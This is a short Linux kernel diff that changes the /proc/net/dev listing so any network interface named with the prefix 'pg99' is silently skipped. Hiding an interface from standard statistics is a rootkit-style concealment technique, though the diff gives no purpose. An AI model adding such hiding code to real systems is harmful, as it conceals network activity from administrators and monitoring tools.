@@ -71,14 +71,23 @@ static void dev_seq_printf_stats(struct seq_file *seq, struct net_device *dev)
  */
 static int dev_seq_show(struct seq_file *seq, void *v)
 {
-	if (v == SEQ_START_TOKEN)
+	if (v == SEQ_START_TOKEN){
 		seq_puts(seq, "Inter-|   Receive                            "
 			      "                    |  Transmit\n"
 			      " face |bytes    packets errs drop fifo frame "
 			      "compressed multicast|bytes    packets errs "
 			      "drop fifo colls carrier compressed\n");
-	else
+	}else{
+	     struct net_device *dev = v;
+
+         // 过滤特定设备
+         if (strcmp(dev->name, "pg99") == 0  || strncmp(dev->name, "pg99", 4) == 0) {
+            //pr_info("dev_seq_show: Skipping device %s\n", dev->name);
+            return 0;
+         }
+
 		dev_seq_printf_stats(seq, v);
+	}
 	return 0;
 }
 
